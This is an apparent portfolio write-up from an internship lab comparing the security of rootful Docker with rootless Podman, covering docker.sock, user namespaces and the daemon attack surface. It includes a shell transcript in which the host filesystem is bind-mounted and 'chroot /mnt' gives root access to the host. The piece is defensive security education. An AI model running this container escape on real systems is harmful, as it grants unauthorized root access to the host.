> [!NOTE]
> This document is a sanitized portfolio version of work completed in an internship lab. Internal hostnames, IP addresses, usernames, organization-specific identifiers, credentials, and private infrastructure details have been replaced with examples. Commands must be adapted and reviewed before use in another environment.

# Docker Security Risks vs Podman Rootless Security

## Goal
Demonstrate the security risks of running Docker containers as root and explain why Podman, especially in rootless mode, provides a safer architecture.  
This target focuses on **privilege boundaries**, **namespaces**, and **risk profiles**, not on performance differences.

---

# 1. Why Docker Is Risky by Design

Docker uses a **rootful daemon (`dockerd`)**:

- runs as **host root**
- controls all container operations
- exposes a root-equivalent API (`/var/run/docker.sock`)
- grants full host privileges if misused

### Critical vulnerabilities:
1. **docker.sock = full system compromise**  
   Any process with access to the socket can become host root instantly.

2. **Container root = Host root (no user namespace by default)**  
   A breakout gives true host root privileges.

3. **Daemon attack surface**  
   A remote or local exploit in `dockerd` compromises the entire system.

4. **Image pulls and unpacking done as real root**  
   Malicious images can exploit root-level file parsing vulnerabilities.

Docker’s architecture inherently requires **maximum trust**.

---

# 2. Why Podman Is Safer

Podman is:

- **daemonless**  
- uses **per-container system calls**  
- integrates with **systemd**  
- supports **fully rootless operation**

### Key advantages:
- No privileged daemon  
- No exposed root socket  
- Image unpacking can run as an unprivileged user  
- Containers run in **user namespaces** by default (rootless mode)

This eliminates entire categories of attacks that plague Docker.

---

# 3. Rootless Podman Security Model

In rootless mode:

- Container “root” → mapped to an **unprivileged** host UID (e.g., 100000)
- Escapes cannot escalate to real root
- Storage lives in the user’s `$HOME`, not `/var/lib/containers`
- No privileged system calls  
- Networking is user-space only (slirp4netns/pasta)

### Effect:
Even if a container is fully compromised, it becomes a **non-privileged host user**, not host root.

---

# 4. Namespace Boundaries: Rootful Docker vs Rootless Podman
```bash
Docker:
host root  
└── dockerd (root)  
├── container A root (host root)  
└── container B root (host root)

Rootless Podman:
host user 'labuser'  
├── container A root → host UID 100000  
└── container B root → host UID 100000
```

## **5. Practical Demonstration**
```
labuser@lab-host:~$ sudo docker run -v /:/mnt -it alpine sh
/ # hostname
394ada1cc8f8

/ # ls /mnt
Docker      boot        etc         init        lib64       media
opt         proc        root        run         sbin        srv
sys         tmp         usr         var         bin         dev
home        lib         lost+found  mnt

##Alpine image has no apt/sudo
/ # apt
sh: apt: not found

##Breakout
/ # chroot /mnt
root@394ada1cc8f8:/# pwd
/
root@394ada1cc8f8:/# id
uid=0(root) gid=0(root) groups=0(root)

##Switching users (showcases access to /etc/passwd)
root@394ada1cc8f8:/# su - labuser
labuser@394ada1cc8f8:~$ whoami
labuser
labuser@394ada1cc8f8:~$ id
uid=1000(labuser) gid=1000(labuser) groups=1000(labuser),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)

labuser@394ada1cc8f8:/# cat /etc/hostname
lab-host
```
The container is started with `-v /:/mnt`, exposing the host’s full filesystem. 
Running `chroot /mnt` replaces the container’s root filesystem with the host’s, giving the container process direct access to host binaries and configuration. 
Successfully switching to the user `labuser` proves that the container is now reading the host’s `/etc/passwd`, `/etc/shadow`, and `/etc/group`. 
This confirms full host compromise and demonstrates that Docker containers are not a security boundary when the host filesystem is bind-mounted.

- **Docker Daemon Socket Security (`/var/run/docker.sock`):** [https://docs.docker.com/engine/security/protect-access/](https://docs.docker.com/engine/security/protect-access/)
    
- **Podman Architecture (Daemonless & Rootless):** [https://docs.podman.io/en/latest/Introduction.html](https://docs.podman.io/en/latest/Introduction.html)

- [Privilege Escalation using Docker Container | by Bishal Chapagain | InfoSec Write-ups](https://infosecwriteups.com/privilege-escalation-using-docker-container-e9110713936b)
 